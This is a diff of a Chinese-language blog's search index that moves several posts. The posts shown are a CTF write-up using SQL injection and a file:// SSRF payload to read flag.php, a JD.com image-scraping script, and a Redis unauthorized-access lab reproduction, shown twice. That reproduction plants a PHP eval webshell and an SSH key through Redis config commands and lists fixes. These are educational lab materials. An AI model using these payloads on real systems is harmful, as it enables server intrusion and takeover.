-<p>接下来继续注入的常规操作。</p>
-<p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>时页面显示正常，并提示了网站的根目录</p>
-<p><img src="https://i.loli.net/2020/11/30/oIDBgmVNszZ3raw.png" alt></p>
-<p>但是当 order by 5 # 时，网页报错，确定是四列。</p>
-<p><strong>爆表名</strong></p>
-<p>本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测</p>
-<p>试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示</p>
-<p><strong>Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31</strong> 提示存在反序列化，但是不知道怎么用继续爆表。</p>
-<p><img src="https://i.loli.net/2020/11/30/RT5xSpfQ4XJakrF.png" alt></p>
-<p><code>?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4#</code></p>
-<p><code>?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;#</code></p>
-<p>爆出一大堆列名。直接读取data的内容</p>
-<p><strong>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</strong></p>
-<p><code>?no=-2 union/**/select 1,(select data from users),3,4 #</code></p>
-<p>发现内容是注册时信息保存为序列化内容</p>
-<p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”sunzy”;s:3:”age”;i:22;s:4:”blog”;s:12:”22.github.io”;}</p>
-<p>到这里就不知道怎么办了。。。</p>
-<h2 id="0x02审计源码"><a href="#0x02审计源码" class="headerlink" title="0x02审计源码"></a>0x02审计源码</h2><p>扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径</p>
-<p><img src="https://i.loli.net/2020/11/30/inMDXtwCpoTqgrc.png" alt></p>
-<p>源码</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>   //<span class="hljs-title">user</span>信息类</span>
-<span class="hljs-class"></span>&#123;
-    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;
-    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;
-    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;
-<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span>
-<span class="hljs-function"></span>&#123;
-    <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
-    <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;
-    <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;
-&#125;
-
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) // 处理<span class="hljs-title">url</span></span>
-<span class="hljs-function"></span>&#123;
-    <span class="hljs-variable">$ch</span> = curl_init();
-
-    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
-    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
-    <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);
-    <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);
-    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;
-        <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;
-    &#125;
-    curl_close(<span class="hljs-variable">$ch</span>);
-
-    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;
-&#125;
-
-<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span>
-<span class="hljs-function"></span>&#123;
-    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);
-&#125;
-
-<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span>
-<span class="hljs-function"></span>&#123;
-    <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;
-    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);
-&#125;
-&#125;</code></pre>
-<p>审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。</p>
-<p><strong>思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。</strong></p>
-<pre><code class="hljs ada">?no=-<span class="hljs-number">2</span>%<span class="hljs-number">20</span>union/**/<span class="hljs-keyword">select</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sunzy&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">22</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;%<span class="hljs-number">20</span>#</code></pre>
-
-<p>查看源码，解base64。</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>sql</tag>
-        <tag>unserailize</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>jdtest</title>
-    <url>/2020/07/18/jdtest/</url>
-    <content><![CDATA[<h1 id="爬取京东商品图片的小测试"><a href="#爬取京东商品图片的小测试" class="headerlink" title="爬取京东商品图片的小测试"></a>爬取京东商品图片的小测试</h1><span id="more"></span>
-<p>访问的页面<br><img src="/2020/07/18/jdtest/jd.png" alt="1"><br>图片链接的位置<br><img src="/2020/07/18/jdtest/link.png" alt="2"></p>
-<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
-<span class="hljs-comment">#@Time : 2020/7/16 14:54</span>
-<span class="hljs-comment">#@Author : sunzy</span>
-<span class="hljs-comment">#@File : jd.py</span>
-
-<span class="hljs-keyword">import</span> re
-<span class="hljs-keyword">import</span> requests
-<span class="hljs-keyword">import</span> time
-<span class="hljs-keyword">import</span> os
-
-<span class="hljs-built_in">dir</span> = <span class="hljs-string">&quot;jdtp&quot;</span>
-<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-built_in">dir</span>):
-    os.mkdir(<span class="hljs-built_in">dir</span>)
-
-baseurl = <span class="hljs-string">&quot;https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu&quot;</span>
-
-head = &#123;
-        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61&quot;</span>
-    &#125;
-response = requests.get(url=baseurl, headers = head)
-<span class="hljs-comment">#print(response.text)</span>
-html = response.text
-
-findlinks = <span class="hljs-string">&#x27;&lt;img width=&quot;220&quot; height=&quot;220&quot; data-img=&quot;\d&quot; src=&quot;(.*?)&quot;.*?&gt;&#x27;</span>
-<span class="hljs-comment">#&lt;img width=&quot;220&quot; height=&quot;220&quot; data-img=&quot;1&quot; src=&quot;//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg&quot; data-lazy-img=&quot;done&quot; source-data-lazy-img=&quot;&quot;&gt;</span>
-urls = re.findall(findlinks, html)
-
-<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:
-    time.sleep(<span class="hljs-number">1</span>)
-    file_name = url.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]
-    res = requests.get(<span class="hljs-string">&quot;http:&quot;</span>+url,headers = head)
-    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-built_in">dir</span>+<span class="hljs-string">&#x27;/&#x27;</span>+file_name, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:
-        f.write(res.content)</code></pre>
-]]></content>
-      <tags>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>网安作业1</title>
     <url>/2020/09/27/homework/</url>
     <content><![CDATA[<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><span id="more"></span>
@@ -1649,6 +1813,49 @@ urls = re.findall(findlinks, html)
       </categories>
       <tags>
         <tag>msf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>jdtest</title>
+    <url>/2020/07/18/jdtest/</url>
+    <content><![CDATA[<h1 id="爬取京东商品图片的小测试"><a href="#爬取京东商品图片的小测试" class="headerlink" title="爬取京东商品图片的小测试"></a>爬取京东商品图片的小测试</h1><span id="more"></span>
+<p>访问的页面<br><img src="/2020/07/18/jdtest/jd.png" alt="1"><br>图片链接的位置<br><img src="/2020/07/18/jdtest/link.png" alt="2"></p>
+<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
+<span class="hljs-comment">#@Time : 2020/7/16 14:54</span>
+<span class="hljs-comment">#@Author : sunzy</span>
+<span class="hljs-comment">#@File : jd.py</span>
+
+<span class="hljs-keyword">import</span> re
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> os
+
+<span class="hljs-built_in">dir</span> = <span class="hljs-string">&quot;jdtp&quot;</span>
+<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-built_in">dir</span>):
+    os.mkdir(<span class="hljs-built_in">dir</span>)
+
+baseurl = <span class="hljs-string">&quot;https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu&quot;</span>
+
+head = &#123;
+        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61&quot;</span>
+    &#125;
+response = requests.get(url=baseurl, headers = head)
+<span class="hljs-comment">#print(response.text)</span>
+html = response.text
+
+findlinks = <span class="hljs-string">&#x27;&lt;img width=&quot;220&quot; height=&quot;220&quot; data-img=&quot;\d&quot; src=&quot;(.*?)&quot;.*?&gt;&#x27;</span>
+<span class="hljs-comment">#&lt;img width=&quot;220&quot; height=&quot;220&quot; data-img=&quot;1&quot; src=&quot;//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg&quot; data-lazy-img=&quot;done&quot; source-data-lazy-img=&quot;&quot;&gt;</span>
+urls = re.findall(findlinks, html)
+
+<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:
+    time.sleep(<span class="hljs-number">1</span>)
+    file_name = url.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]
+    res = requests.get(<span class="hljs-string">&quot;http:&quot;</span>+url,headers = head)
+    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-built_in">dir</span>+<span class="hljs-string">&#x27;/&#x27;</span>+file_name, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:
+        f.write(res.content)</code></pre>
+]]></content>
+      <tags>
+        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -2131,96 +2338,6 @@ var_dump(<span class="hljs-keyword">$this</span>);
       </categories>
   </entry>
   <entry>
-    <title>redis</title>
-    <url>/2021/04/14/redis/</url>
-    <content><![CDATA[<h1 id="redis未授权访问漏洞复现"><a href="#redis未授权访问漏洞复现" class="headerlink" title="redis未授权访问漏洞复现"></a>redis未授权访问漏洞复现</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Redis因配置不当就会导致未授权访问。在默认情况下，Redis会绑定在 0.0.0.0:6379。如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样 Redis 服务直接暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问到目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，还可以利用 Redis 自身提供的config 命令进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
-<p>该漏洞的产生条件有以下两点：</p>
-<p>1.redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；<br>2.没有设置密码认证（一般为空），可以免密码(认证)远程登录redis服务。</p>
-<p>漏洞危害：<br>(1) 攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；<br>(2) 攻击者可通过执行lua代码，或通过数据备份功能往磁盘写入后门文件；<br>(3) 最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器;</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在kali中安装redis 3.2.0</p>
-<pre><code class="hljs awk">创建redis安装目录
-mkdir <span class="hljs-regexp">/usr/</span>local/redis
-cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>
-wget http:<span class="hljs-regexp">//</span>download.redis.io<span class="hljs-regexp">/releases/</span>redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gz
-<span class="hljs-regexp">//</span>获取redis压缩包
-tar xzf redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gz
-cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>
-make <span class="hljs-comment">#编译安装</span></code></pre>
-
-<p>安装完成之后需要修改配置文件，配置允许可以远程访问。</p>
-<p>vim redis.conf #修改默认配置文件</p>
-<p>在bind 127.0.0.1前面加上#号进行注释，并将protected-mode设置为no。</p>
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414153138387.png" alt="image-20210414153138387"></p>
-<p>然后进入src目录，将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了），并将redis.conf拷贝到/etc/目录下。</p>
-<pre><code class="hljs awk">cd src
-cp redis-cli <span class="hljs-regexp">/usr/</span>bin
-cp redis-server <span class="hljs-regexp">/usr/</span>bin
-cp redis.conf <span class="hljs-regexp">/etc/</span></code></pre>
-
-<p>开启redis服务</p>
-<pre><code class="hljs awk">redis-server <span class="hljs-regexp">/etc/</span>redis.conf</code></pre>
-
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414153309311.png" alt="image-20210414153309311"></p>
-<p>第一台作为攻击机即可，然后将这台主机克隆作为目标主机</p>
-<p>攻击机</p>
-<p>ip:192.168.164.145</p>
-<p>目标主机</p>
-<p>ip:192.168.164.23</p>
-<p>首先确定目标主机是否开启redis服务，使用nmap扫描端口6379</p>
-<p>如下，显示了目标使用的redis版本以及服务器的信息</p>
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413225839841.png" alt="image-20210413225839841"></p>
-<p>开始利用</p>
-<h2 id="1-写入木马文件"><a href="#1-写入木马文件" class="headerlink" title="1.写入木马文件"></a>1.写入木马文件</h2><p>首先进入redis安装目录的src中执行</p>
-<pre><code class="hljs avrasm">./redis-<span class="hljs-keyword">cli</span> -h <span class="hljs-number">192.168</span><span class="hljs-number">.164</span><span class="hljs-number">.23</span></code></pre>
-
-<p>成功控制目标的redis服务</p>
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230028713.png" alt="image-20210413230028713"></p>
-<p>向其网站根目录中写入一句话木马</p>
-<pre><code class="hljs php-template"><span class="xml">config set dir /var/www/html</span>
-
-<span class="xml">config set dbfilename shell.php</span>
-
-<span class="xml">set x &quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;</span>
-
-<span class="xml">save </span></code></pre>
-
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230359912.png" alt="image-20210413230359912"></p>
-<p>save成功后，目标主机的网站根目录就出现了木马文件</p>
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230408356.png" alt="image-20210413230408356"></p>
-<p>使用蚁剑连接</p>
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230614612.png" alt="image-20210413230614612"></p>
-<h2 id="2-写ssh-keygen公钥然后使用私钥进行登陆"><a href="#2-写ssh-keygen公钥然后使用私钥进行登陆" class="headerlink" title="2.写ssh-keygen公钥然后使用私钥进行登陆"></a>2.写ssh-keygen公钥然后使用私钥进行登陆</h2><p>写入ssh公钥后可以在本机存储对应的ssh密钥，然后直接无密码登陆。</p>
-<p>首先生成公钥密钥文件</p>
-<pre><code class="hljs awk">ssh-keygen -t rsa
-
-cat <span class="hljs-regexp">/root/</span>.ssh/id_rsa.pub</code></pre>
-
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414131910830.png" alt="image-20210414131910830"></p>
-<p>继续使用命令</p>
-<pre><code class="hljs swift">config <span class="hljs-keyword">set</span> dir <span class="hljs-operator">/</span>root<span class="hljs-operator">/</span>.ssh<span class="hljs-operator">/</span>
-
-config <span class="hljs-keyword">set</span> authorized_keys
-
-<span class="hljs-keyword">set</span> x <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>\id_rsa.pub的内容<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>
-
-save</code></pre>
-
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414131805309.png" alt="image-20210414131805309"></p>
-<p>使用公钥连接</p>
-<pre><code class="hljs css">ssh -<span class="hljs-selector-tag">i</span> id_rsa root<span class="hljs-keyword">@192</span>.168.164.23</code></pre>
-
-<p>这里的id_rsa与创建ssh密钥输入的内容一致</p>
-<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414133547275.png" alt="image-20210414133547275"></p>
-<h2 id="3-利用计划任务反弹shell"><a href="#3-利用计划任务反弹shell" class="headerlink" title="3.利用计划任务反弹shell"></a>3.利用计划任务反弹shell</h2><p>只能在centos环境中利用因为centos环境中的计划任务文件可以忽略乱码，ubuntu环境因为无法忽略文件中的乱码因此无法使用</p>
-<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1、限制登录ip<br>在redis.conf文件中设置redis访问的ip白名单，如果项目允许的话最好设置为只允许本地访问。</p>
-<p>2、添加密码<br>在redis.conf配置文件中找到requirepass并去掉前面的#， 然后在后面设置一个高强度的密码。因为redis验证密码的速度很快，给攻击者进行高速的爆破密码提供了一个良好的基础，所以设置一个高强度的密码不仅解决了未授权的问题还能防止密码爆破。</p>
-<p>3、修改默认端口</p>
-]]></content>
-      <tags>
-        <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>python安全攻防</title>
     <url>/2021/08/16/python%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/</url>
     <content><![CDATA[<h1 id="多线程爆破账号密码"><a href="#多线程爆破账号密码" class="headerlink" title="多线程爆破账号密码"></a>多线程爆破账号密码</h1><p>文件目录</p>
@@ -2629,6 +2746,96 @@ cmdline.execute(<span class="hljs-string">&quot;scrapy crawl 爬虫名字&quot;<
       </tags>
   </entry>
   <entry>
+    <title>redis</title>
+    <url>/2021/04/14/redis/</url>
+    <content><![CDATA[<h1 id="redis未授权访问漏洞复现"><a href="#redis未授权访问漏洞复现" class="headerlink" title="redis未授权访问漏洞复现"></a>redis未授权访问漏洞复现</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Redis因配置不当就会导致未授权访问。在默认情况下，Redis会绑定在 0.0.0.0:6379。如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样 Redis 服务直接暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问到目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，还可以利用 Redis 自身提供的config 命令进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
+<p>该漏洞的产生条件有以下两点：</p>
+<p>1.redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；<br>2.没有设置密码认证（一般为空），可以免密码(认证)远程登录redis服务。</p>
+<p>漏洞危害：<br>(1) 攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；<br>(2) 攻击者可通过执行lua代码，或通过数据备份功能往磁盘写入后门文件；<br>(3) 最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器;</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在kali中安装redis 3.2.0</p>
+<pre><code class="hljs awk">创建redis安装目录
+mkdir <span class="hljs-regexp">/usr/</span>local/redis
+cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>
+wget http:<span class="hljs-regexp">//</span>download.redis.io<span class="hljs-regexp">/releases/</span>redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gz
+<span class="hljs-regexp">//</span>获取redis压缩包
+tar xzf redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gz
+cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>
+make <span class="hljs-comment">#编译安装</span></code></pre>
+
+<p>安装完成之后需要修改配置文件，配置允许可以远程访问。</p>
+<p>vim redis.conf #修改默认配置文件</p>
+<p>在bind 127.0.0.1前面加上#号进行注释，并将protected-mode设置为no。</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414153138387.png" alt="image-20210414153138387"></p>
+<p>然后进入src目录，将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了），并将redis.conf拷贝到/etc/目录下。</p>
+<pre><code class="hljs awk">cd src
+cp redis-cli <span class="hljs-regexp">/usr/</span>bin
+cp redis-server <span class="hljs-regexp">/usr/</span>bin
+cp redis.conf <span class="hljs-regexp">/etc/</span></code></pre>
+
+<p>开启redis服务</p>
+<pre><code class="hljs awk">redis-server <span class="hljs-regexp">/etc/</span>redis.conf</code></pre>
+
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414153309311.png" alt="image-20210414153309311"></p>
+<p>第一台作为攻击机即可，然后将这台主机克隆作为目标主机</p>
+<p>攻击机</p>
+<p>ip:192.168.164.145</p>
+<p>目标主机</p>
+<p>ip:192.168.164.23</p>
+<p>首先确定目标主机是否开启redis服务，使用nmap扫描端口6379</p>
+<p>如下，显示了目标使用的redis版本以及服务器的信息</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413225839841.png" alt="image-20210413225839841"></p>
+<p>开始利用</p>
+<h2 id="1-写入木马文件"><a href="#1-写入木马文件" class="headerlink" title="1.写入木马文件"></a>1.写入木马文件</h2><p>首先进入redis安装目录的src中执行</p>
+<pre><code class="hljs avrasm">./redis-<span class="hljs-keyword">cli</span> -h <span class="hljs-number">192.168</span><span class="hljs-number">.164</span><span class="hljs-number">.23</span></code></pre>
+
+<p>成功控制目标的redis服务</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230028713.png" alt="image-20210413230028713"></p>
+<p>向其网站根目录中写入一句话木马</p>
+<pre><code class="hljs php-template"><span class="xml">config set dir /var/www/html</span>
+
+<span class="xml">config set dbfilename shell.php</span>
+
+<span class="xml">set x &quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;</span>
+
+<span class="xml">save </span></code></pre>
+
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230359912.png" alt="image-20210413230359912"></p>
+<p>save成功后，目标主机的网站根目录就出现了木马文件</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230408356.png" alt="image-20210413230408356"></p>
+<p>使用蚁剑连接</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230614612.png" alt="image-20210413230614612"></p>
+<h2 id="2-写ssh-keygen公钥然后使用私钥进行登陆"><a href="#2-写ssh-keygen公钥然后使用私钥进行登陆" class="headerlink" title="2.写ssh-keygen公钥然后使用私钥进行登陆"></a>2.写ssh-keygen公钥然后使用私钥进行登陆</h2><p>写入ssh公钥后可以在本机存储对应的ssh密钥，然后直接无密码登陆。</p>
+<p>首先生成公钥密钥文件</p>
+<pre><code class="hljs awk">ssh-keygen -t rsa
+
+cat <span class="hljs-regexp">/root/</span>.ssh/id_rsa.pub</code></pre>
+
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414131910830.png" alt="image-20210414131910830"></p>
+<p>继续使用命令</p>
+<pre><code class="hljs swift">config <span class="hljs-keyword">set</span> dir <span class="hljs-operator">/</span>root<span class="hljs-operator">/</span>.ssh<span class="hljs-operator">/</span>
+
+config <span class="hljs-keyword">set</span> authorized_keys
+
+<span class="hljs-keyword">set</span> x <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>\id_rsa.pub的内容<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>
+
+save</code></pre>
+
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414131805309.png" alt="image-20210414131805309"></p>
+<p>使用公钥连接</p>
+<pre><code class="hljs css">ssh -<span class="hljs-selector-tag">i</span> id_rsa root<span class="hljs-keyword">@192</span>.168.164.23</code></pre>
+
+<p>这里的id_rsa与创建ssh密钥输入的内容一致</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414133547275.png" alt="image-20210414133547275"></p>
+<h2 id="3-利用计划任务反弹shell"><a href="#3-利用计划任务反弹shell" class="headerlink" title="3.利用计划任务反弹shell"></a>3.利用计划任务反弹shell</h2><p>只能在centos环境中利用因为centos环境中的计划任务文件可以忽略乱码，ubuntu环境因为无法忽略文件中的乱码因此无法使用</p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1、限制登录ip<br>在redis.conf文件中设置redis访问的ip白名单，如果项目允许的话最好设置为只允许本地访问。</p>
+<p>2、添加密码<br>在redis.conf配置文件中找到requirepass并去掉前面的#， 然后在后面设置一个高强度的密码。因为redis验证密码的速度很快，给攻击者进行高速的爆破密码提供了一个良好的基础，所以设置一个高强度的密码不仅解决了未授权的问题还能防止密码爆破。</p>
+<p>3、修改默认端口</p>
+]]></content>
+      <tags>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>spiderofwords</title>
     <url>/2021/05/02/spiderofwords/</url>
     <content><![CDATA[<p>scripy爬虫爬取单词(word.iciba.com)</p>
